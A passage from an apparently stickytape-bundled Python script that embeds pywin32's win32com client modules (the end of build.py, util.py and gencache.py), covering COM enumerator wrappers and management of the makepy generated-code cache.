MakePublicAttributeName(className, is_global=False):\n    # Given a class attribute that needs to be public, convert it to a\n    # reasonable name.\n    # Also need to be careful that the munging doesnt\n    # create duplicates - eg, just removing a leading "_" is likely to cause\n    # a clash.\n    # if is_global is True, then the name is a global variable that may\n    # overwrite a builtin - eg, "None"\n    if className[:2] == "__":\n        return demunge_leading_underscores(className)\n    elif className == "None":\n        # assign to None is evil (and SyntaxError in 2.4, even though\n        # iskeyword says False there) - note that if it was a global\n        # it would get picked up below\n        className = "NONE"\n    elif iskeyword(className):\n        # most keywords are lower case (except True, False etc in py3k)\n        ret = className.capitalize()\n        # but those which aren\'t get forced upper.\n        if ret == className:\n            ret = ret.upper()\n        return ret\n    elif is_global and hasattr(__builtins__, className):\n        # builtins may be mixed case.  If capitalizing it doesn\'t change it,\n        # force to all uppercase (eg, "None", "True" become "NONE", "TRUE"\n        ret = className.capitalize()\n        if ret == className:  # didn\'t change - force all uppercase.\n            ret = ret.upper()\n        return ret\n    # Strip non printable chars\n    return "".join([char for char in className if char in valid_identifier_chars])\n\n\n# Given a default value passed by a type library, return a string with\n# an appropriate repr() for the type.\n# Takes a raw ELEMDESC and returns a repr string, or None\n# (NOTE: The string itself may be \'"None"\', which is valid, and different to None.\n# XXX - To do: Dates are probably screwed, but can they come in?\ndef MakeDefaultArgRepr(defArgVal):\n    try:\n        inOut = defArgVal[1]\n    except IndexError:\n        # something strange - assume is in param.\n        inOut = pythoncom.PARAMFLAG_FIN\n\n    if inOut & pythoncom.PARAMFLAG_FHASDEFAULT:\n        # times need special handling...\n        val = defArgVal[2]\n        if isinstance(val, datetime.datetime):\n            # VARIANT <-> SYSTEMTIME conversions always lose any sub-second\n            # resolution, so just use a \'timetuple\' here.\n            return repr(tuple(val.utctimetuple()))\n        if type(val) is TimeType:\n            # must be the \'old\' pywintypes time object...\n            year = val.year\n            month = val.month\n            day = val.day\n            hour = val.hour\n            minute = val.minute\n            second = val.second\n            msec = val.msec\n            return (\n                "pywintypes.Time((%(year)d, %(month)d, %(day)d, %(hour)d, %(minute)d, %(second)d,0,0,0,%(msec)d))"\n                % locals()\n            )\n        return repr(val)\n    return None\n\n\ndef BuildCallList(\n    fdesc,\n    names,\n    defNamedOptArg,\n    defNamedNotOptArg,\n    defUnnamedArg,\n    defOutArg,\n    is_comment=False,\n):\n    "Builds a Python declaration for a method."\n    # Names[0] is the func name - param names are from 1.\n    numArgs = len(fdesc[2])\n    numOptArgs = fdesc[6]\n    strval = ""\n    if numOptArgs == -1:  # Special value that says "var args after here"\n        firstOptArg = numArgs\n        numArgs = numArgs - 1\n    else:\n        firstOptArg = numArgs - numOptArgs\n    for arg in range(numArgs):\n        try:\n            argName = names[arg + 1]\n            namedArg = argName is not None\n        except IndexError:\n            namedArg = 0\n        if not namedArg:\n            argName = "arg%d" % (arg)\n        thisdesc = fdesc[2][arg]\n        # See if the IDL specified a default value\n        defArgVal = MakeDefaultArgRepr(thisdesc)\n        if defArgVal is None:\n            # Out params always get their special default\n            if (\n                thisdesc[1] & (pythoncom.PARAMFLAG_FOUT | pythoncom.PARAMFLAG_FIN)\n                == pythoncom.PARAMFLAG_FOUT\n            ):\n                defArgVal = defOutArg\n            else:\n                # Unnamed arg - always allow default values.\n                if namedArg:\n                    # Is a named argument\n                    if arg >= firstOptArg:\n                        defArgVal = defNamedOptArg\n                    else:\n                        defArgVal = defNamedNotOptArg\n                else:\n                    defArgVal = defUnnamedArg\n\n        argName = MakePublicAttributeName(argName)\n        # insanely long lines with an \'encoding\' flag crashes python 2.4.0\n        # keep 5 args per line\n        # This may still fail if the arg names are insane, but that seems\n        # unlikely.  See also _BuildArgList()\n        if (arg + 1) % 5 == 0:\n            strval = strval + "\\n"\n            if is_comment:\n                strval = strval + "#"\n            strval = strval + "\\t\\t\\t"\n        strval = strval + ", " + argName\n        if defArgVal:\n            strval = strval + "=" + defArgVal\n    if numOptArgs == -1:\n        strval = strval + ", *" + names[-1]\n\n    return strval\n\n\nif __name__ == "__main__":\n    print("Use \'makepy.py\' to generate Python code - this module is just a helper")\n')
    __stickytape_write_module('win32com/client/util.py', b'"""General client side utilities.\n\nThis module contains utility functions, used primarily by advanced COM\nprogrammers, or other COM modules.\n"""\nimport pythoncom\nfrom win32com.client import Dispatch, _get_good_object_\n\nPyIDispatchType = pythoncom.TypeIIDs[pythoncom.IID_IDispatch]\n\n\ndef WrapEnum(ob, resultCLSID=None):\n    """Wrap an object in a VARIANT enumerator.\n\n    All VT_DISPATCHs returned by the enumerator are converted to wrapper objects\n    (which may be either a class instance, or a dynamic.Dispatch type object).\n\n    """\n    if type(ob) != pythoncom.TypeIIDs[pythoncom.IID_IEnumVARIANT]:\n        ob = ob.QueryInterface(pythoncom.IID_IEnumVARIANT)\n    return EnumVARIANT(ob, resultCLSID)\n\n\nclass Enumerator:\n    """A class that provides indexed access into an Enumerator\n\n    By wrapping a PyIEnum* object in this class, you can perform\n    natural looping and indexing into the Enumerator.\n\n    Looping is very efficient, but it should be noted that although random\n    access is supported, the underlying object is still an enumerator, so\n    this will force many reset-and-seek operations to find the requested index.\n\n    """\n\n    def __init__(self, enum):\n        self._oleobj_ = enum  # a PyIEnumVARIANT\n        self.index = -1\n\n    def __getitem__(self, index):\n        return self.__GetIndex(index)\n\n    def __call__(self, index):\n        return self.__GetIndex(index)\n\n    def __GetIndex(self, index):\n        if type(index) != type(0):\n            raise TypeError("Only integer indexes are supported for enumerators")\n        # NOTE\n        # In this context, self.index is users purely as a flag to say\n        # "am I still in sequence".  The user may call Next() or Reset() if they\n        # so choose, in which case self.index will not be correct (although we\n        # still want to stay in sequence)\n        if index != self.index + 1:\n            # Index requested out of sequence.\n            self._oleobj_.Reset()\n            if index:\n                self._oleobj_.Skip(\n                    index\n                )  # if asked for item 1, must skip 1, Python always zero based.\n        self.index = index\n        result = self._oleobj_.Next(1)\n        if len(result):\n            return self._make_retval_(result[0])\n        raise IndexError("list index out of range")\n\n    def Next(self, count=1):\n        ret = self._oleobj_.Next(count)\n        realRets = []\n        for r in ret:\n            realRets.append(self._make_retval_(r))\n        return tuple(realRets)  # Convert back to tuple.\n\n    def Reset(self):\n        return self._oleobj_.Reset()\n\n    def Clone(self):\n        return self.__class__(self._oleobj_.Clone(), self.resultCLSID)\n\n    def _make_retval_(self, result):\n        return result\n\n\nclass EnumVARIANT(Enumerator):\n    def __init__(self, enum, resultCLSID=None):\n        self.resultCLSID = resultCLSID\n        Enumerator.__init__(self, enum)\n\n    def _make_retval_(self, result):\n        return _get_good_object_(result, resultCLSID=self.resultCLSID)\n\n\nclass Iterator:\n    def __init__(self, enum, resultCLSID=None):\n        self.resultCLSID = resultCLSID\n        self._iter_ = iter(enum.QueryInterface(pythoncom.IID_IEnumVARIANT))\n\n    def __iter__(self):\n        return self\n\n    def __next__(self):\n        return _get_good_object_(next(self._iter_), resultCLSID=self.resultCLSID)\n')
    __stickytape_write_module('win32com/client/gencache.py', b'"""Manages the cache of generated Python code.\n\nDescription\n  This file manages the cache of generated Python code.  When run from the\n  command line, it also provides a number of options for managing that cache.\n\nImplementation\n  Each typelib is generated into a filename of format "{guid}x{lcid}x{major}x{minor}.py"\n\n  An external persistant dictionary maps from all known IIDs in all known type libraries\n  to the type library itself.\n\n  Thus, whenever Python code knows the IID of an object, it can find the IID, LCID and version of\n  the type library which supports it.  Given this information, it can find the Python module\n  with the support.\n\n  If necessary, this support can be generated on the fly.\n\nHacks, to do, etc\n  Currently just uses a pickled dictionary, but should used some sort of indexed file.\n  Maybe an OLE2 compound file, or a bsddb file?\n"""\nimport pywintypes, os, sys\nimport pythoncom\nimport win32com, win32com.client\nimport glob\nimport traceback\nfrom . import CLSIDToClass\nimport operator\nfrom importlib import reload\n\nbForDemandDefault = 0  # Default value of bForDemand - toggle this to change the world - see also makepy.py\n\n# The global dictionary\nclsidToTypelib = {}\n\n# If we have a different version of the typelib generated, this\n# maps the "requested version" to the "generated version".\nversionRedirectMap = {}\n\n# There is no reason we *must* be readonly in a .zip, but we are now,\n# Rather than check for ".zip" or other tricks, PEP302 defines\n# a "__loader__" attribute, so we use that.\n# (Later, it may become necessary to check if the __loader__ can update files,\n# as a .zip loader potentially could - but punt all that until a need arises)\nis_readonly = is_zip = hasattr(win32com, "__loader__") and hasattr(\n    win32com.__loader__, "archive"\n)\n\n# A dictionary of ITypeLibrary objects for demand generation explicitly handed to us\n# Keyed by usual clsid, lcid, major, minor\ndemandGeneratedTypeLibraries = {}\n\nimport pickle as pickle\n\n\ndef __init__():\n    # Initialize the module.  Called once explicitly at module import below.\n    try:\n        _LoadDicts()\n    except IOError:\n        Rebuild()\n\n\npickleVersion = 1\n\n\ndef _SaveDicts():\n    if is_readonly:\n        raise RuntimeError(\n            "Trying to write to a readonly gencache (\'%s\')!" % win32com.__gen_path__\n        )\n    f = open(os.path.join(GetGeneratePath(), "dicts.dat"), "wb")\n    try:\n        p = pickle.Pickler(f)\n        p.dump(pickleVersion)\n        p.dump(clsidToTypelib)\n    finally:\n        f.close()\n\n\ndef _LoadDicts():\n    # Load the dictionary from a .zip file if that is where we live.\n    if is_zip:\n        import io as io\n\n        loader = win32com.__loader__\n        arc_path = loader.archive\n        dicts_path = os.path.join(win32com.__gen_path__, "dicts.dat")\n        if dicts_path.startswith(arc_path):\n            dicts_path = dicts_path[len(arc_path) + 1 :]\n        else:\n            # Hm. See below.\n            return\n        try:\n            data = loader.get_data(dicts_path)\n        except AttributeError:\n            # The __loader__ has no get_data method.  See below.\n            return\n        except IOError:\n            # Our gencache is in a .zip file (and almost certainly readonly)\n            # but no dicts file.  That actually needn\'t be fatal for a frozen\n            # application.  Assuming they call "EnsureModule" with the same\n            # typelib IDs they have been frozen with, that EnsureModule will\n            # correctly re-build the dicts on the fly.  However, objects that\n            # rely on the gencache but have not done an EnsureModule will\n            # fail (but their apps are likely to fail running from source\n            # with a clean gencache anyway, as then they would be getting\n            # Dynamic objects until the cache is built - so the best answer\n            # for these apps is to call EnsureModule, rather than freezing\n            # the dict)\n            return\n        f = io.BytesIO(data)\n    else:\n        # NOTE: IOError on file open must be caught by caller.\n        f = open(os.path.join(win32com.__gen_path__, "dicts.dat"), "rb")\n    try:\n        p = pickle.Unpickler(f)\n        version = p.load()\n        global clsidToTypelib\n        clsidToTypelib = p.load()\n        versionRedirectMap.clear()\n    finally:\n        f.close()\n\n\ndef GetGeneratedFileName(clsid, lcid, major, minor):\n    """Given the clsid, lcid, major and  minor for a type lib, return\n    the file name (no extension) providing this support.\n    """\n    return str(clsid).upper()[1:-1] + "x%sx%sx%s" % (lcid, major, minor)\n\n\ndef SplitGeneratedFileName(fname):\n    """Reverse of GetGeneratedFileName()"""\n    return tuple(fname.split("x", 4))\n\n\ndef GetGeneratePath():\n    """Returns the name of the path to generate to.\n    Checks the directory is OK.\n    """\n    assert not is_readonly, "Why do you want the genpath for a readonly store?"\n    try:\n        os.makedirs(win32com.__gen_path__)\n        # os.mkdir(win32com.__gen_path__)\n    except os.error:\n        pass\n    try:\n        fname = os.path.join(win32com.__gen_path__, "__init__.py")\n        os.stat(fname)\n    except os.error:\n        f = open(fname, "w")\n        f.write(\n            "# Generated file - this directory may be deleted to reset the COM cache...\\n"\n        )\n        f.write("import win32com\\n")\n        f.write(\n            "if __path__[:-1] != win32com.__gen_path__: __path__.append(win32com.__gen_path__)\\n"\n        )\n        f.close()\n\n    return win32com.__gen_path__\n\n\n#\n# The helpers for win32com.client.Dispatch and OCX clients.\n#\ndef GetClassForProgID(progid):\n    """Get a Python class for a Program ID\n\n    Given a Program ID, return a Python class which wraps the COM object\n\n    Returns the Python class, or None if no module is available.\n\n    Params\n    progid -- A COM ProgramID or IID (eg, "Word.Application")\n    """\n    clsid = pywintypes.IID(progid)  # This auto-converts named to IDs.\n    return GetClassForCLSID(clsid)\n\n\ndef GetClassForCLSID(clsid):\n    """Get a Python class for a CLSID\n\n    Given a CLSID, return a Python class which wraps the COM object\n\n    Returns the Python class, or None if no module is available.\n\n    Params\n    clsid -- A COM CLSID (or string repr of one)\n    """\n    # first, take a short-cut - we may already have generated support ready-to-roll.\n    clsid = str(clsid)\n    if CLSIDToClass.HasClass(clsid):\n        return CLSIDToClass.GetClass(clsid)\n    mod = GetModuleForCLSID(clsid)\n    if mod is None:\n        return None\n    try:\n        return CLSIDToClass.GetClass(clsid)\n    except KeyError:\n        return None\n\n\ndef GetModuleForProgID(progid):\n    """Get a Python module for a Program ID\n\n    Given a Program ID, return a Python module which contains the\n    class which wraps the COM object.\n\n    Returns the Python module, or None if no module is available.\n\n    Params\n    progid -- A COM ProgramID or IID (eg, "Word.Application")\n    """\n    try:\n        iid = pywintypes.IID(progid)\n    except pywintypes.com_error:\n        return None\n    return GetModuleForCLSID(iid)\n\n\ndef GetModuleForCLSID(clsid):\n    """Get a Python module for a CLSID\n\n    Given a CLSID, return a Python module which contains the\n    class which wraps the COM object.\n\n    Returns the Python module, or None if no module is available.\n\n    Params\n    progid -- A COM CLSID (ie, not the description)\n    """\n    clsid_str = str(clsid)\n    try:\n        typelibCLSID, lcid, major, minor = clsidToTypelib[clsid_str]\n    except KeyError:\n        return None\n\n    try:\n        mod = GetModuleForTypelib(typelibCLSID, lcid, major, minor)\n    except ImportError:\n        mod = None\n    if mod is not None:\n        sub_mod = mod.CLSIDToPackageMap.get(clsid_str)\n        if sub_mod is None:\n            sub_mod = mod.VTablesToPackageMap.get(clsid_str)\n        if sub_mod is not None:\n            sub_mod_name = mod.__name__ + "." + sub_mod\n            try:\n                __import__(sub_mod_name)\n            except ImportError:\n                info = typelibCLSID, lcid, major, minor\n                # Force the generation.  If this typelibrary has explicitly been added,\n                # use it (it may not be registered, causing a lookup by clsid to fail)\n                if info in demandGeneratedTypeLibraries:\n                    info = demandGeneratedTypeLibraries[info]\n                from . import makepy\n\n                makepy.GenerateChildFromTypeLibSpec(sub_mod, info)\n                # Generate does an import...\n            mod = sys.modules[sub_mod_name]\n    return mod\n\n\ndef GetModuleForTypelib(typelibCLSID, lcid, major, minor):\n    """Get a Python module for a type library ID\n\n    Given the CLSID of a typelibrary, return an imported Python module,\n    else None\n\n    Params\n    typelibCLSID -- IID of the type library.\n    major -- Integer major version.\n    minor -- Integer minor version\n    lcid -- Integer LCID for the library.\n    """\n    modName = GetGeneratedFileName(typelibCLSID, lcid, major, minor)\n    mod = _GetModule(modName)\n    # If the import worked, it doesn\'t mean we have actually added this\n    # module to our cache though - check that here.\n    if "_in_gencache_" not in mod.__dict__:\n        AddModuleToCache(typelibCLSID, lcid, major, minor)\n        assert "_in_gencache_" in mod.__dict__\n    return mod\n\n\ndef MakeModuleForTypelib(\n    typelibCLSID,\n    lcid,\n    major,\n    minor,\n    progressInstance=None,\n    bForDemand=bForDemandDefault,\n    bBuildHidden=1,\n):\n    """Generate support for a type library.\n\n    Given the IID, LCID and version information for a type library, generate\n    and import the necessary support files.\n\n    Returns the Python module.  No exceptions are caught.\n\n    Params\n    typelibCLSID -- IID of the type library.\n    major -- Integer major version.\n    minor -- Integer minor version.\n    lcid -- Integer LCID for the library.\n    progressInstance -- Instance to use as progress indicator, or None to\n                        use the GUI progress bar.\n    """\n    from . import makepy\n\n    makepy.GenerateFromTypeLibSpec(\n        (typelibCLSID, lcid, major, minor),\n        progressInstance=progressInstance,\n        bForDemand=bForDemand,\n        bBuildHidden=bBuildHidden,\n    )\n    return GetModuleForTypelib(typelibCLSID, lcid, major, minor)\n\n\ndef MakeModuleForTypelibInterface(\n    typelib_ob, progressInstance=None, bForDemand=bForDemandDefault, bBuildHidden=1\n):\n    """Generate support for a type library.\n\n    Given a PyITypeLib interface generate and import the necessary support files.  This is useful\n    for getting makepy support for a typelibrary that is not registered - the caller can locate\n    and load the type library itself, rather than relying on COM to find it.\n\n    Returns the Python module.\n\n    Params\n    typelib_ob -- The type library itself\n    progressInstance -- Instance to use as progress indicator, or None to\n                        use the GUI progress bar.\n    """\n    from . import makepy\n\n    try:\n        makepy.GenerateFromTypeLibSpec(\n            typelib_ob,\n            progressInstance=progressInstance,\n            bForDemand=bForDemandDefault,\n            bBuildHidden=bBuildHidden,\n        )\n    except pywintypes.com_error:\n        return None\n    tla = typelib_ob.GetLibAttr()\n    guid = tla[0]\n    lcid = tla[1]\n    major = tla[3]\n    minor = tla[4]\n    return GetModuleForTypelib(guid, lcid, major, minor)\n\n\ndef EnsureModuleForTypelibInterface(\n    typelib_ob, progressInstance=None, bForDemand=bForDemandDefault, bBuildHidden=1\n):\n    """Check we have support for a type library, generating if not.\n\n    Given a PyITypeLib interface generate and import the necessary\n    support files if necessary. This is useful for getting makepy support\n    for a typelibrary that is not registered - the caller can locate and\n    load the type library itself, rather than relying on COM to find it.\n\n    Returns the Python module.\n\n    Params\n    typelib_ob -- The type library itself\n    progressInstance -- Instance to use as progress indicator, or None to\n                        use the GUI progress bar.\n    """\n    tla = typelib_ob.GetLibAttr()\n    guid = tla[0]\n    lcid = tla[1]\n    major = tla[3]\n    minor = tla[4]\n\n    # If demand generated, save the typelib interface away for later use\n    if bForDemand:\n        demandGeneratedTypeLibraries[(str(guid), lcid, major, minor)] = typelib_ob\n\n    try:\n        return GetModuleForTypelib(guid, lcid, major, minor)\n    except ImportError:\n        pass\n    # Generate it.\n    return MakeModuleForTypelibInterface(\n        typelib_ob, progressInstance, bForDemand, bBuildHidden\n    )\n\n\ndef ForgetAboutTypelibInterface(typelib_ob):\n    """Drop any references to a typelib previously added with EnsureModuleForTypelibInterface and forDemand"""\n    tla = typelib_ob.GetLibAttr()\n    guid = tla[0]\n    lcid = tla[1]\n    major = tla[3]\n    minor = tla[4]\n    info = str(guid), lcid, major, minor\n    try:\n        del demandGeneratedTypeLibraries[info]\n    except KeyError:\n        # Not worth raising an exception - maybe they dont know we only remember for demand generated, etc.\n        print(\n            "ForgetAboutTypelibInterface:: Warning - type library with info %s is not being remembered!"\n            % (info,)\n        )\n    # and drop any version redirects to it\n    for key, val in list(versionRedirectMap.items()):\n        if val == info:\n            del versionRedirectMap[key]\n\n\ndef EnsureModule(\n    typelibCLSID,\n    lcid,\n    major,\n    minor,\n    progressInstance=None,\n    bValidateFile=not is_readonly,\n    bForDemand=bForDemandDefault,\n    bBuildHidden=1,\n):\n    """Ensure Python support is loaded for a type library, generating if necessary.\n\n    Given the IID, LCID and version information for a type library, check and if\n    necessary (re)generate, then import the necessary support files. If we regenerate the file, there\n    is no way to totally snuff out all instances of the old module in Python, and thus we will regenerate the file more than necessary,\n    unless makepy/genpy is modified accordingly.\n\n\n    Returns the Python module.  No exceptions are caught during the generate process.\n\n    Params\n    typelibCLSID -- IID of the type library.\n    major -- Integer major version.\n    minor -- Integer minor version\n    lcid -- Integer LCID for the library.\n    progressInstance -- Instance to use as progress indicator, or None to\n                        use the GUI progress bar.\n    bValidateFile -- Whether or not to perform cache validation or not\n    bForDemand -- Should a complete generation happen now, or on demand?\n    bBuildHidden -- Should hidden members/attributes etc be generated?\n    """\n    bReloadNeeded = 0\n    try:\n        try:\n            module = GetModuleForTypelib(typelibCLSID, lcid, major, minor)\n        except ImportError:\n            # If we get an ImportError\n            # We may still find a valid cache file under a different MinorVersion #\n            # (which windows will search out for us)\n            # print "Loading reg typelib", typelibCLSID, major, minor, lcid\n            module = None\n            try:\n                tlbAttr = pythoncom.LoadRegTypeLib(\n                    typelibCLSID, major, minor, lcid\n                ).GetLibAttr()\n                # if the above line doesn\'t throw a pythoncom.com_error, check if\n                # it is actually a different lib than we requested, and if so, suck it in\n                if tlbAttr[1] != lcid or tlbAttr[4] != minor:\n                    # print "Trying 2nd minor #", tlbAttr[1], tlbAttr[3], tlbAttr[4]\n                    try:\n                        module = GetModuleForTypelib(\n                            typelibCLSID, tlbAttr[1], tlbAttr[3], tlbAttr[4]\n                        )\n                    except ImportError:\n                        # We don\'t have a module, but we do have a better minor\n                        # version - remember that.\n                        minor = tlbAttr[4]\n                # else module remains None\n            except pythoncom.com_error:\n                # couldn\'t load any typelib - mod remains None\n                pass\n        if module is not None and bValidateFile:\n            assert not is_readonly, "Can\'t validate in a read-only gencache"\n            try:\n                typLibPath = pythoncom.QueryPathOfRegTypeLib(\n                    typelibCLSID, major, minor, lcid\n                )\n                # windows seems to add an extra \\0 (via the underlying BSTR)\n                # The mainwin toolkit does not add this erroneous \\0\n                if typLibPath[-1] == "\\0":\n                    typLibPath = typLibPath[:-1]\n                suf = getattr(os.path, "supports_unicode_filenames", 0)\n                if not suf:\n                    # can\'t pass unicode filenames directly - convert\n                    try:\n                        typLibPath = typLibPath.encode(sys.getfilesystemencoding())\n                    except AttributeError:  # no sys.getfilesystemencoding\n                        typLibPath = str(typLibPath)\n                tlbAttributes = pythoncom.LoadRegTypeLib(\n                    typelibCLSID, major, minor, lcid\n                ).GetLibAttr()\n            except pythoncom.com_error:\n                # We have a module, but no type lib - we should still\n                # run with what we have though - the typelib may not be\n                # deployed here.\n                bValidateFile = 0\n        if module is not None and bValidateFile:\n            assert not is_readonly, "Can\'t validate in a read-only gencache"\n            filePathPrefix = "%s\\\\%s" % (\n                GetGeneratePath(),\n                GetGeneratedFileName(typelibCLSID, lcid, major, minor),\n            )\n            filePath = filePathPrefix + ".py"\n            filePathPyc = filePathPrefix + ".py"\n            if __debug__:\n                filePathPyc = filePathPyc + "c"\n            else:\n                filePathPyc = filePathPyc + "o"\n            # Verify that type library is up to date.\n            # If we have a differing MinorVersion or genpy has bumped versions, update the file\n            from . import genpy\n\n            if (\n                module.MinorVersion != tlbAttributes[4]\n                or genpy.makepy_version != module.makepy_version\n            ):\n                # print "Version skew: %d, %d" % (module.MinorVersion, tlbAttributes[4])\n                # try to erase the bad file from the cache\n                try:\n                    os.unlink(filePath)\n                except os.error:\n                    pass\n                try:\n                    os.unlink(filePathPyc)\n                except os.error:\n                    pass\n                if os.path.isdir(filePathPrefix):\n                    import shutil\n\n                    shutil.rmtree(filePathPrefix)\n                minor = tlbAttributes[4]\n                module = None\n                bReloadNeeded = 1\n            else:\n                minor = module.MinorVersion\n                filePathPrefix = "%s\\\\%s" % (\n                    GetGeneratePath(),\n                    GetGeneratedFileName(typelibCLSID, lcid, major, minor),\n                )\n                filePath = filePathPrefix + ".py"\n                filePathPyc = filePathPrefix + ".pyc"\n                # print "Trying py stat: ", filePath\n                fModTimeSet = 0\n                try:\n                    pyModTime = os.stat(filePath)[8]\n                    fModTimeSet = 1\n                except os.error as e:\n                    # If .py file fails, try .pyc file\n                    # print "Trying pyc stat", filePathPyc\n                    try:\n                        pyModTime = os.stat(filePathPyc)[8]\n                        fModTimeSet = 1\n                    except os.error as e:\n                        pass\n                # print "Trying stat typelib", pyModTime\n                # print str(typLibPath)\n                typLibModTime = os.stat(typLibPath)[8]\n                if fModTimeSet and (typLibModTime > pyModTime):\n                    bReloadNeeded = 1\n                    module = None\n    except (ImportError, os.error):\n        module = None\n    if module is None:\n        # We need to build an item.  If we are in a read-only cache, we\n        # can\'t/don\'t want to do this - so before giving up, check for\n        # a different minor version in our cache - according to COM, this is OK\n        if is_readonly:\n            key = str(typelibCLSID), lcid, major, minor\n            # If we have been asked before, get last result.\n            try:\n                return versionRedirectMap[key]\n            except KeyError:\n                pass\n            # Find other candidates.\n            items = []\n            for desc in GetGeneratedInfos():\n                if key[0] == desc[0] and key[1] == desc[1] and key[2] == desc[2]:\n                    items.append(desc)\n            if items:\n                # Items are all identical, except for last tuple element\n                # We want the latest minor version we have - so just sort and grab last\n                items.sort()\n                new_minor = items[-1][3]\n                ret = GetModuleForTypelib(typelibCLSID, lcid, major, new_minor)\n            else:\n                ret = None\n            # remember and return\n            versionRedirectMap[key] = ret\n            return ret\n        # print "Rebuilding: ", major, minor\n        module = MakeModuleForTypelib(\n            typelibCLSID,\n            lcid,\n            major,\n            minor,\n            progressInstance,\n            bForDemand=bForDemand,\n            bBuildHidden=bBuildHidden,\n        )\n        # If we replaced something, reload it\n        if bReloadNeeded:\n            module = reload(module)\n            AddModuleToCache(typelibCLSID, lcid, major, minor)\n    return module\n\n\ndef EnsureDispatch(\n    prog_id, bForDemand=1\n):  # New fn, so we default the new demand feature to on!\n    """Given a COM prog_id, return an object that is using makepy support, building if necessary"""\n    disp = win32com.client.Dispatch(prog_id)\n    if not disp.__dict__.get("CLSID"):  # Eeek - no makepy support - try and build it.\n        try:\n            ti = disp._oleobj_.GetTypeInfo()\n            disp_clsid = ti.GetTypeAttr()[0]\n            tlb, index = ti.GetContainingTypeLib()\n            tla = tlb.GetLibAttr()\n            mod = EnsureModule(tla[0], tla[1], tla[3], tla[4], bForDemand=bForDemand)\n            GetModuleForCLSID(disp_clsid)\n            # Get the class from the module.\n            from . import CLSIDToClass\n\n            disp_class = CLSIDToClass.GetClass(str(disp_clsid))\n            disp = disp_class(disp._oleobj_)\n        except pythoncom.com_error:\n            raise TypeError(\n                "This COM object can not automate the makepy process - please run makepy manually for this object"\n            )\n    return disp\n\n\ndef AddModuleToCache(\n    typelibclsid, lcid, major, minor, verbose=1, bFlushNow=not is_readonly\n):\n    """Add a newly generated file to the cache dictionary."""\n    fname = GetGeneratedFileName(typelibclsid, lcid, major, minor)\n    mod = _GetModule(fname)\n    # if mod._in_gencache_ is already true, then we are reloading this\n    # module - this doesn\'t mean anything special though!\n    mod._in_gencache_ = 1\n    info = str(typelibclsid), lcid, major, minor\n    dict_modified = False\n\n    def SetTypelibForAllClsids(dict):\n        nonlocal dict_modified\n        for clsid, cls in dict.items():\n            if clsidToTypelib.get(clsid) != info:\n                clsidToTypelib[clsid] = info\n                dict_modified = True\n\n    SetTypelibForAllClsids(mod.CLSIDToClassMap)\n    SetTypelibForAllClsids(mod.CLSIDToPackageMap)\n    SetTypelibForAllClsids(mod.VTablesToClassMap)\n    SetTypelibForAllClsids(mod.VTablesToPackageMap)\n\n    # If this lib was previously redirected, drop it\n    if info in versionRedirectMap:\n        del versionRedirectMap[info]\n    if bFlushNow and dict_modified:\n        _SaveDicts()\n\n\ndef GetGeneratedInfos():\n    zip_pos = win32com.__gen_path__.find(".zip\\\\")\n    if zip_pos >= 0:\n        import zipfile\n\n        zip_file = win32com.__gen_path__[: zip_pos + 4]\n        zip_path = win32com.__gen_path__[zip_pos + 5 :].replace("\\\\", "/")\n        zf = zipfile.ZipFile(zip_file)\n        infos = {}\n        for n in zf.namelist():\n            if not n.startswith(zip_path):\n                continue\n            base = n[len(zip_path) + 1 :].split("/")[0]\n            try:\n                iid, lcid, major, minor = base.split("x")\n                lcid = int(lcid)\n                major = int(major)\n                minor = int(minor)\n                iid = pywintypes.IID("{" + iid + "}")\n            except ValueError:\n                continue\n            except pywintypes.com_error:\n                # invalid IID\n                continue\n            infos[(iid, lcid, major, minor)] = 1\n        zf.close()\n        return list(infos.keys())\n    else:\n        # on the file system\n        files = glob.glob(win32com.__gen_path__ + "\\\\*")\n        ret = []\n        for file in files:\n            if not os.path.isdir(file) and not os.path.splitext(file)[1] == ".py":\n                continue\n            name = os.path.splitext(os.path.split(file)[1])[0]\n            try:\n                iid, lcid, major, minor = name.split("x")\n                iid = pywintypes.IID("{" + iid + "}")\n                lcid = int(lcid)\n                major = int(major)\n                minor = int(minor)\n            except ValueError:\n                continue\n            except pywintypes.com_error:\n                # invalid IID\n                continue\n            ret.append((iid, lcid, major, minor))\n        return ret\n\n\ndef _GetModule(fname):\n    """Given the name of a module in the gen_py directory, import and return it."""\n    mod_name = "win32com.gen_py.%s" % fname\n    mod = __import__(mod_name)\n    return sys.modules[mod_name]\n\n\ndef Rebuild(verbose=1):\n    """Rebuild the cache indexes from the file system."""\n    clsidToTypelib.clear()\n    infos = GetGeneratedInfos()\n    if verbose and len(infos):  # Dont bother reporting this when directory is empty!\n        print("Rebuilding cache of generated files for COM support...")\n    for info in infos:\n        iid, lcid, major, minor = info\n        if verbose:\n            print("Checking", GetGeneratedFileName(*info))\n        try:\n            AddModuleToCache(iid, lcid, major, minor, verbose, 0)\n        except:\n            print(\n                "Could not add module %s - %s: %s"\n                % (info, sys.exc_info()[0], sys.exc_info()[1])\n            )\n    if verbose and len(infos):  # Dont bother reporting this when directory is empty!\n        print("Done.")\n    _SaveDicts()\n\n\ndef _Dump():\n    print("Cache is in directory", win32com.__gen_path__)\n    # Build a unique dir\n    d = {}\n    for clsid, (typelibCLSID, lcid, major, minor) in clsidToTypelib.items():\n        d[typelibCLSID, lcid, major, minor] = None\n    for typelibCLSID, lcid, major, minor in d.keys():\n        mod = GetModuleForTypelib(typelibCLSID, lcid, major, minor)\n        print("%s - %s" % (mod.__doc__, typelibCLSID))\n\n\n# Boot up\n__init__()\n\n\ndef usage():\n    usageString = """\\\n\t  Usage: gencache [-q] [-d] [-r]\n\n\t\t\t -q         - Quiet\n\t\t\t -d         - Dump the cache (typelibrary description and filename).\n\t\t\t -r         - Rebuild the cache dictionary from the existing .py files\n\t"""\n    print(usageString)\n    sys.exit(1)\n\n\nif __name__ == "__main__":\n    import getopt\n\n    try:\n        opts, args = getopt.getopt(sys.argv[1:], "qrd")\n    except getopt.error as message:\n        print(message)\n        usage()\n\n    # we only have options - complain about real args, or none at all!\n    if len(sys.argv) == 1 or args:\n        print(usage())\n\n    verbose = 1\n    for opt, val in opts:\n        if opt == "-d":  # Dump\n            _Dump()\n        if opt == "-r":\n            Rebuild(verbose)\n        if opt == "-q":\n            verbose = 0\n')
